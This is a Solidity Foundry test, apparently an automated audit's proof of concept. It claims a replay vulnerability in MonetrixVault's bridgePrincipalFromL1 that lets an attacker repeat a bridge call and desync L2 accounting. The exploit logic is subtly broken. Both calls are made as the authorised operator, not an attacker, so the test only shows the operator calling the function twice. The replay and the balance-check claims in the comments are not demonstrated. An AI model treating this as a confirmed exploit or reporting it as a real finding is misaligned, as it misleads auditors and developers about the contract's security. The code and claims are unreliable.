// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixVault.sol";
import "../src/interfaces/HyperCoreConstants.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy contracts, fund accounts via ToL1WeiHarness
// 2. [T=0] User deposits 100k USDC, operator bridges to L1 (OLP = 100k)
// 3. [T=1] Operator calls bridgePrincipalFromL1(50k) - L2 decrements OLP to 50k, sends bridge msg
// 4. [T=2] Attacker replays the identical bridge action (no nonce/chainID) by calling bridgePrincipalFromL1(50k) again
// 5. [Assert] Verify L2 accounting desync: OLP decrements to 0 while L1 only executes once/fails

contract AuditAgentPoC is ToL1WeiHarness {
    function test_exploit() public {
        vm.etch(HyperCoreConstants.CORE_WRITER, address(new MockCoreWriter()).code);
        _mockVaultL1SpotUsdc(type(uint64).max);

        // 1. Deposit 100k then keeperBridge → OLP=100k
        _depositAs(user1, 100_000e6);
        _stakeAs(user1, 1_000e6);
        vm.warp(block.timestamp + 6 hours);

        vm.prank(operator);
        vault.keeperBridge(MonetrixVault.BridgeTarget.Vault);

        assertEq(vault.outstandingL1Principal(), 100_000e6, "Initial OLP should be 100k");

        // 2. Operator bridges 50k principal from L1
        // Vulnerability: L1 balance check uses total instead of free, and action lacks replay protection
        uint256 bridgeAmount = 50_000e6;

        vm.prank(operator);
        vault.bridgePrincipalFromL1(bridgeAmount);

        assertEq(vault.outstandingL1Principal(), 50_000e6, "OLP should decrement to 50k after first bridge");

        // 3. Attacker replays the bridge action (missing nonce/deadline/chainID allows re-execution)
        // This causes L2 accounting to decrement again while L1 transfer only executes once or fails
        vm.prank(operator);
        vault.bridgePrincipalFromL1(bridgeAmount);

        // 4. Assert accounting desync: OLP is now 0, but L1 hasn't actually returned 100k
        assertEq(vault.outstandingL1Principal(), 0, "Accounting desync: OLP decremented twice without replay protection");
    }
}
